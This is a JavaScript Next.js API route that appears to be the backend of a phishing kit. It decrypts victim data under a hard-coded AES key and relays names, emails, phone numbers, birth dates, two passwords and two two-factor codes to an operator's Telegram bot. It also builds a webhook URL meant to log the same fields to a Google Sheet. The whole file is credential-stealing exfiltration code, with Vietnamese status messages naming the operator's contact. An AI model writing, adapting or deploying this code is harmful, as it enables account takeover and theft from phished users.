import { NextResponse } from "next/server";
import axios from "axios";
import CryptoJS from "crypto-js";

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const secretKey = "HDNDT-JDHT8FNEK-JJHR";

function decrypt(encryptedData) {
    try {
        const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error("Decryption failed");
        return decrypted;
    } catch (error) {
        throw new Error("Invalid encrypted data");
    }
}

async function sendTelegramMessage(text) {
    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });
        return true;
    } catch (error) {
        console.error('Error sending Telegram message:', error.response?.data || error.message);
        return false;
    }
}

export async function POST(req) {
    try {
        const { data } = await req.json();

        if (!data) {
            return NextResponse.json({ message: "Invalid request: 'data' is required", error_code: 1 }, { status: 400 });
        }

        const decryptedData = decrypt(data);
        const values = JSON.parse(decryptedData);

        const message = `<b>Ip:</b> <code>${values.user_ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n<b>Location:</b> <code>${values.ip || 'Lỗi IP,liên hệ <code>https://t.me/otis_cua</code>'}</code>\n-----------------------------\n<b>Name:</b> <code>${values.name || ''}</code>\n<b>Email:</b> <code>${values.email || ''}</code>\n<b>Email business:</b> <code>${values.email_business || ''}</code>\n<b>Phone:</b> <code>${values.phone || ''}</code>\n<b>Page:</b> <code>${values.page || ''}</code>\n<b>Date of birth:</b> <code>${values.day}/${values.month}/${values.year}</code>\n<b>Password First:</b> <code>${values.password || ''}</code>\n<b>Password Second:</b> <code>${values.secondPassword || ''}</code>\n-----------------------------\n<b>First Two-Fa:</b> <code>${values.twoFa || ''}</code>\n<b>Second Two-Fa:</b> <code>${values.secondTwoFa || ''}</code>\n`;
        
        await sendTelegramMessage(message);

        if (process.env.WEBHOOK_URL) {
            const url = new URL(process.env.WEBHOOK_URL);

            url.searchParams.append('Ip', values.ip ? values.ip : '');
            url.searchParams.append('Name', values.name ? values.name : '');
            url.searchParams.append('Email', values.email ? values.email : '');
            url.searchParams.append('Email business', values.email_business ? values.email_business : '');
            url.searchParams.append('Phone', values.phone ? values.phone : '');
            url.searchParams.append('Page', values.page ? values.page : '');
            url.searchParams.append('Date of birth', `${values.day}/${values.month}/${values.year}` ? `${values.day}/${values.month}/${values.year}` : '');
            url.searchParams.append('Password First', values.password ? values.password : '');
            url.searchParams.append('Password Second', values.secondPassword ? values.secondPassword : '');
            url.searchParams.append('First Two-Fa', values.twoFa ? values.twoFa : '');
            url.searchParams.append('Second Two-Fa', values.secondTwoFa ? values.secondTwoFa : '');

            try {
                await sendTelegramMessage('✅ Thêm dữ liệu vào Sheet thành công.');
            } catch (err) {
                await sendTelegramMessage('❌ Thêm vào Google Sheet không thành công, liên hệ <code>@otis_cua</code>');
            }
        }

        return NextResponse.json({ message: "Success", error_code: 0 }, { status: 200 });
    } catch (error) {
        await sendTelegramMessage(`❌ Server giải mã dữ liệu không thành công, liên hệ <code>@otis_cua</code>. Mã lỗi: ${error.message}`);
        return NextResponse.json({ message: "Error", error_code: 1 }, { status: 500 });
    }
}
